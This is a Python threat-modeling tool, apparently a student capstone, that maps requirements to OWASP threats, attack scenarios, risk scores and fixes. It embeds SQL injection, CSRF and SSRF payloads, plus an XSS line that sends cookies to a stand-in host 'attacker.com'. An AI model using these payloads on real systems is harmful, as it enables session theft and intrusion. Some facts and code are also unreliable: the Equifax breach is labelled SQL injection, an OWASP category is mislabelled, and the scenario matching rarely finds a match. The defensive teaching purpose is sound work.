"""
THREAT MODELING & ATTACK SCENARIO GENERATOR
============================================

Comprehensive threat modeling system including:
- OWASP Top 10 vulnerability patterns
- Attack scenario generation
- Risk assessment
- Mitigation recommendations
- Real-world threat databases

For capstone defense - advanced security features
"""

import json
from typing import Dict, List, Tuple, Optional
from dataclasses import dataclass, asdict, field
from enum import Enum


class ThreatCategory(Enum):
    """OWASP threat categories"""
    INJECTION = "A03:2021 – Injection"
    BROKEN_AUTH = "A07:2021 – Identification and Authentication Failures"
    SENSITIVE_DATA = "A02:2021 – Cryptographic Failures"
    XXMLXE = "A04:2021 – Insecure Deserialization"
    BROKEN_ACCESS = "A01:2021 – Broken Access Control"
    SECURITY_CONFIG = "A05:2021 – Security Misconfiguration"
    XSS = "A03:2021 – Injection (XSS variant)"
    DESERIALIZATION = "A08:2021 – Software and Data Integrity Failures"
    LOGGING = "A09:2021 – Security Logging and Monitoring Failures"
    SSRF = "A10:2021 – Server-Side Request Forgery (SSRF)"


@dataclass
class AttackScenario:
    """Represents a specific attack scenario"""
    scenario_id: str
    threat_category: ThreatCategory
    attack_vector: str              # How attacker enters
    attack_complexity: str          # Low, Medium, High
    affected_assets: List[str]
    attack_steps: List[str]
    potential_impact: str
    affected_cwe: List[str]         # CWE references
    preconditions: List[str]
    detection_method: str
    mitigation_steps: List[str]
    likelihood: str                 # Low, Medium, High, Critical
    impact_severity: str            # Low, Medium, High, Critical
    cvss_score: Optional[float] = None  # CVSS 3.1 score
    real_world_examples: List[str] = field(default_factory=list)


@dataclass
class RiskAssessment:
    """Risk assessment result"""
    threat_id: str
    risk_level: str                 # Critical, High, Medium, Low
    likelihood_score: float         # 0-10
    impact_score: float            # 0-10
    risk_score: float              # likelihood * impact
    priority_rank: int
    remediation_effort_hours: float


class ThreatModelingEngine:
    """Advanced threat modeling system"""
    
    def __init__(self):
        """Initialize threat database"""
        self.threats = self._initialize_threat_database()
        self.attack_scenarios = self._initialize_attack_scenarios()
    
    def _initialize_threat_database(self) -> Dict:
        """Initialize comprehensive threat database"""
        return {
            'injection': {
                'name': 'SQL Injection / Command Injection',
                'cwe': ['CWE-89', 'CWE-78'],
                'description': 'Untrusted data incorporated into dynamic SQL or OS commands',
                'attack_vectors': [
                    'Malicious SQL in user input fields',
                    'String concatenation in query building',
                    'Unvalidated OS command parameters'
                ],
                'impact': 'Database breach, data exfiltration, unauthorized access',
                'examples': [
                    "'); DROP TABLE users; --",
                    "1 OR 1=1",
                    "'; UNION SELECT password FROM admin; --"
                ]
            },
            'xss': {
                'name': 'Cross-Site Scripting (XSS)',
                'cwe': ['CWE-79'],
                'description': 'User input reflected or stored without sanitization',
                'attack_vectors': [
                    'Reflected XSS via URL parameters',
                    'Stored XSS in user profiles/comments',
                    'DOM-based XSS via client-side processing'
                ],
                'impact': 'Session hijacking, credential theft, malware distribution',
                'examples': [
                    '<script>alert("XSS")</script>',
                    '<img src=x onerror="alert(document.cookie)">',
                    '"><script>fetch("attacker.com?c="+document.cookie)</script>'
                ]
            },
            'csrf': {
                'name': 'Cross-Site Request Forgery (CSRF)',
                'cwe': ['CWE-352'],
                'description': 'Unauthorized actions performed on behalf of user',
                'attack_vectors': [
                    'Forged form submissions',
                    'Malicious link clicks',
                    'Hidden image requests'
                ],
                'impact': 'Unauthorized transfers, account changes, admin actions',
                'examples': [
                    '<img src="https://bank.com/transfer?to=attacker&amount=1000">',
                    '<form action="admin.com/delete"><input name="id" value="1"></form>'
                ]
            },
            'auth_bypass': {
                'name': 'Authentication/Authorization Bypass',
                'cwe': ['CWE-287', 'CWE-862'],
                'description': 'Weak or missing authentication mechanisms',
                'attack_vectors': [
                    'Default credentials',
                    'Weak password policies',
                    'Missing MFA',
                    'Token prediction',
                    'Session fixation'
                ],
                'impact': 'Unauthorized access, privilege escalation, account takeover',
                'examples': [
                    'Using admin/admin credentials',
                    'JWT token tampering',
                    'Predictable session tokens'
                ]
            },
            'data_exposure': {
                'name': 'Sensitive Data Exposure',
                'cwe': ['CWE-327', 'CWE-311'],
                'description': 'Sensitive data transmitted or stored without encryption',
                'attack_vectors': [
                    'Unencrypted HTTP transmission',
                    'Weak encryption algorithms',
                    'Authentication over plaintext',
                    'Hardcoded credentials'
                ],
                'impact': 'Data breach, privacy violation, financial loss',
                'examples': [
                    'Transmitting passwords over HTTP',
                    'Using MD5 for password hashing',
                    'API keys in source code'
                ]
            },
            'rce': {
                'name': 'Remote Code Execution (RCE)',
                'cwe': ['CWE-94', 'CWE-78', 'CWE-434'],
                'description': 'Arbitrary code execution on server/client',
                'attack_vectors': [
                    'Deserialization of untrusted data',
                    'File upload + execution',
                    'Template injection',
                    'Code evaluation (eval/exec)'
                ],
                'impact': 'Complete system compromise, data theft, malware installation',
                'examples': [
                    'Uploading .php file in file upload',
                    'Pickle deserialization in Python',
                    'Template injection in Jinja2'
                ]
            },
            'dos': {
                'name': 'Denial of Service (DoS)',
                'cwe': ['CWE-400'],
                'description': 'Service unavailability through resource exhaustion',
                'attack_vectors': [
                    'Large request body processing',
                    'Algorithmic complexity (ReDoS)',
                    'Resource leaks',
                    'Billion laughs XML attack'
                ],
                'impact': 'Service unavailability, business disruption',
                'examples': [
                    'Very long regex patterns (ReDoS)',
                    'Recursive entity expansion in XML',
                    'Large file uploads without limits'
                ]
            },
            'ssrf': {
                'name': 'Server-Side Request Forgery (SSRF)',
                'cwe': ['CWE-918'],
                'description': 'Server makes requests to attacker-specified URLs',
                'attack_vectors': [
                    'URL parameter without validation',
                    'Image processing from user URL',
                    'Webhook functionality'
                ],
                'impact': 'Internal service access, metadata exposure, port scanning',
                'examples': [
                    'fetch("file:///etc/passwd")',
                    'http://localhost:6379/shutdown',
                    'http://169.254.169.254/latest/meta-data/'
                ]
            }
        }
    
    def _initialize_attack_scenarios(self) -> List[AttackScenario]:
        """Initialize real-world attack scenarios"""
        return [
            AttackScenario(
                scenario_id="ATTACK-001",
                threat_category=ThreatCategory.INJECTION,
                attack_vector="URL parameter",
                attack_complexity="Low",
                affected_assets=["User database", "Admin account"],
                attack_steps=[
                    "1. Identify user search functionality",
                    "2. Test with single quote: ' and observe error",
                    "3. Craft SQL payload: ' OR '1'='1",
                    "4. Retrieve all user records"
                ],
                potential_impact="Complete database access, credential theft",
                affected_cwe=["CWE-89"],
                preconditions=["Web application with user search", "No input validation"],
                detection_method="Web Application Firewall rules, SQL query logging",
                mitigation_steps=[
                    "Use prepared statements with parameterized queries",
                    "Input validation and sanitization",
                    "Least privilege database accounts"
                ],
                likelihood="High",
                impact_severity="Critical",
                cvss_score=9.8,
                real_world_examples=["Equifax breach (2017)", "Sony Pictures (2014)"]
            ),
            AttackScenario(
                scenario_id="ATTACK-002",
                threat_category=ThreatCategory.BROKEN_AUTH,
                attack_vector="Weak password policy",
                attack_complexity="Low",
                affected_assets=["User accounts", "Sensitive data"],
                attack_steps=[
                    "1. Attempt common passwords: 123456, password, abc123",
                    "2. Check if account lockout exists",
                    "3. Brute force with 1000 passwords/minute",
                    "4. Gain access to first account"
                ],
                potential_impact="Account takeover, unauthorized access",
                affected_cwe=["CWE-287"],
                preconditions=["Weak password requirements", "No rate limiting"],
                detection_method="Failed login monitoring, IP blocking, SIEM alerts",
                mitigation_steps=[
                    "Enforce strong password requirements (12+ chars, mixed case)",
                    "Implement account lockout (5 failed attempts)",
                    "Enable multi-factor authentication",
                    "Rate limiting on login endpoint"
                ],
                likelihood="High",
                impact_severity="High",
                cvss_score=7.5,
                real_world_examples=["LinkedIn breach (2012)", "Yahoo breach"]
            ),
            AttackScenario(
                scenario_id="ATTACK-003",
                threat_category=ThreatCategory.XSS,
                attack_vector="Comment field",
                attack_complexity="Medium",
                affected_assets=["Website reputation", "User browsers", "Session tokens"],
                attack_steps=[
                    "1. Find comment functionality without sanitization",
                    "2. Submit: <script>fetch('attacker.com?cookie='+document.cookie)</script>",
                    "3. When users view comment, script executes",
                    "4. Collect session tokens from multiple users"
                ],
                potential_impact="Session hijacking, credential theft, malware",
                affected_cwe=["CWE-79"],
                preconditions=["Unsanitized output", "No Content Security Policy"],
                detection_method="WAF rules, CSP violation reports, suspicious script tags",
                mitigation_steps=[
                    "HTML encode all user output",
                    "Implement Content Security Policy",
                    "Use DOMPurify for client-side sanitization",
                    "HTTPOnly and Secure flags on cookies"
                ],
                likelihood="High",
                impact_severity="High",
                cvss_score=7.1,
                real_world_examples=["MySpace worm (2005)", "Twitter XSS (2010)"]
            )
        ]
    
    def identify_threats_in_requirement(self, requirement: str) -> List[Dict]:
        """Identify relevant threats for a requirement"""
        identified_threats = []
        req_lower = requirement.lower()
        
        threat_keywords = {
            'injection': ['input', 'query', 'execute', 'command', 'database'],
            'xss': ['display', 'user content', 'html', 'script'],
            'csrf': ['form', 'action', 'transfer', 'delete'],
            'auth_bypass': ['authenticate', 'login', 'permission', 'access'],
            'data_exposure': ['password', 'encrypt', 'secure', 'transmission'],
            'rce': ['file', 'upload', 'execute', 'dynamic'],
            'dos': ['large', 'request', 'process', 'timeout'],
            'ssrf': ['url', 'fetch', 'request', 'external']
        }
        
        for threat_key, keywords in threat_keywords.items():
            if any(kw in req_lower for kw in keywords):
                threat_data = self.threats.get(threat_key, {})
                identified_threats.append({
                    'threat_key': threat_key,
                    'name': threat_data.get('name'),
                    'cwe': threat_data.get('cwe'),
                    'examples': threat_data.get('examples', [])[:2]
                })
        
        return identified_threats
    
    def generate_attack_scenarios(self, requirement: str) -> Dict:
        """Generate attack scenarios for a requirement"""
        scenarios = {}
        threats = self.identify_threats_in_requirement(requirement)
        
        for threat in threats:
            matching_scenarios = [s for s in self.attack_scenarios 
                                if threat['threat_key'].upper() in s.threat_category.value.upper()]
            scenarios[threat['name']] = [asdict(s) for s in matching_scenarios[:2]]
        
        return scenarios
    
    def assess_risk(self, threat_name: str, likelihood: str, impact_severity: str) -> RiskAssessment:
        """Assess risk level"""
        likelihood_scores = {'Low': 3, 'Medium': 5, 'High': 8, 'Critical': 10}
        impact_scores = {'Low': 2, 'Medium': 5, 'High': 8, 'Critical': 10}
        
        likelihood_score = likelihood_scores.get(likelihood, 5)
        impact_score = impact_scores.get(impact_severity, 5)
        risk_score = (likelihood_score * impact_score) / 10
        
        if risk_score >= 8:
            risk_level = "Critical"
            remediation_hours = 8
        elif risk_score >= 6:
            risk_level = "High"
            remediation_hours = 4
        elif risk_score >= 4:
            risk_level = "Medium"
            remediation_hours = 2
        else:
            risk_level = "Low"
            remediation_hours = 1
        
        return RiskAssessment(
            threat_id=threat_name,
            risk_level=risk_level,
            likelihood_score=float(likelihood_score),
            impact_score=float(impact_score),
            risk_score=float(risk_score),
            priority_rank=int(risk_score),
            remediation_effort_hours=remediation_hours
        )


class ThreatModelingReport:
    """Generate threat modeling reports"""
    
    @staticmethod
    def create_report(requirement: str, engine: ThreatModelingEngine) -> Dict:
        """Create comprehensive threat report"""
        threats = engine.identify_threats_in_requirement(requirement)
        scenarios = engine.generate_attack_scenarios(requirement)
        
        report = {
            'requirement': requirement,
            'identified_threats': threats,
            'attack_scenarios': scenarios,
            'risk_assessments': [
                asdict(engine.assess_risk(t['name'], 'High', 'High')) 
                for t in threats[:3]
            ],
            'recommendations': ThreatModelingReport._generate_recommendations(threats),
            'estimated_security_effort_hours': sum([engine.assess_risk(t['name'], 'High', 'High').remediation_effort_hours for t in threats]) if threats else 0
        }
        
        return report
    
    @staticmethod
    def _generate_recommendations(threats: List[Dict]) -> List[str]:
        """Generate security recommendations"""
        recommendations = []
        
        if not threats:
            return ["No significant security threats identified"]
        
        for threat in threats[:3]:
            threat_name = threat['name']
            if 'Injection' in threat_name:
                recommendations.append("Implement parameterized queries and input validation")
            elif 'XSS' in threat_name:
                recommendations.append("Implement output encoding and Content Security Policy")
            elif 'CSRF' in threat_name:
                recommendations.append("Implement CSRF tokens and SameSite cookie attribute")
            elif 'Authentication' in threat_name:
                recommendations.append("Enforce strong passwords and implement MFA")
            elif 'Encryption' in threat_name or 'Data' in threat_name:
                recommendations.append("Use TLS for transmission and strong encryption for storage")
            elif 'Code Execution' in threat_name:
                recommendations.append("Disable dangerous functions and validate uploads")
            elif 'DoS' in threat_name:
                recommendations.append("Implement rate limiting and request size limits")
        
        return list(set(recommendations))  # Remove duplicates


# ============================================================================
# REAL-WORLD EXAMPLES DATABASE
# ============================================================================

class RealWorldExamplesDB:
    """Database of real-world security breaches and exploits"""
    
    examples = [
        {
            'name': 'SQL Injection - Equifax (2017)',
            'threat_type': 'SQL Injection',
            'year': 2017,
            'impact': '147 million records compromised',
            'root_cause': 'Unpatched Apache Struts vulnerability in web application',
            'lesson': 'Keep frameworks/libraries updated, input validation critical'
        },
        {
            'name': 'XSS - Stored XSS worm (2005)',
            'threat_type': 'Cross-Site Scripting',
            'year': 2005,
            'impact': 'Millions of MySpace profiles infected',
            'root_cause': 'No HTML encoding of user profile content',
            'lesson': 'Always encode user input before displaying'
        },
        {
            'name': 'Weak Authentication - LinkedIn (2012)',
            'threat_type': 'Weak Password Storage',
            'year': 2012,
            'impact': '6.5 million passwords compromised',
            'root_cause': 'Simple unsalted SHA1 hashing without complexity requirements',
            'lesson': 'Use bcrypt/scrypt/Argon2, enforce strong passwords'
        },
        {
            'name': 'CSRF - Facebook (2008)',
            'threat_type': 'Cross-Site Request Forgery',
            'year': 2008,
            'impact': 'Users could be tricked into unfriending others',
            'root_cause': 'No CSRF token validation on state-changing operations',
            'lesson': 'Always validate CSRF tokens and SameSite cookies'
        },
        {
            'name': 'Data Exposure - AWS S3 Bucket (2019)',
            'threat_type': 'Misconfigured Cloud Storage',
            'year': 2019,
            'impact': 'Billions of records exposed publicly',
            'root_cause': 'S3 bucket configured with public read access',
            'lesson': 'Security should be default-deny, audit cloud permissions'
        }
    ]
    
    @staticmethod
    def get_examples_for_threat(threat_type: str) -> List[Dict]:
        """Get real-world examples for a threat type"""
        return [ex for ex in RealWorldExamplesDB.examples 
                if threat_type.lower() in ex['threat_type'].lower()]


# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    print("\n" + "="*80)
    print("THREAT MODELING ENGINE v1.0")
    print("="*80)
    
    engine = ThreatModelingEngine()
    
    # Example requirement
    requirement = "System allows users to search other users by name. Results displayed as HTML."
    
    print(f"\nAnalyzing: {requirement}")
    print("-" * 80)
    
    # Identify threats
    threats = engine.identify_threats_in_requirement(requirement)
    print(f"\n🔐 Identified {len(threats)} Threats:")
    for threat in threats:
        print(f"  • {threat['name']}")
    
    # Generate scenarios
    print(f"\n⚠️  Attack Scenarios:")
    scenarios = engine.generate_attack_scenarios(requirement)
    for threat_name, attack_list in scenarios.items():
        print(f"  • {threat_name}: {len(attack_list)} scenarios")
    
    # Create report
    report = ThreatModelingReport.create_report(requirement, engine)
    print(f"\n📋 Security Assessment:")
    print(f"  • Estimated Effort: {report['estimated_security_effort_hours']:.1f} hours")
    print(f"  • Recommendations: {len(report['recommendations'])}")
    for rec in report['recommendations']:
        print(f"    - {rec}")
    
    print("\n✅ Threat Modeling Complete!")
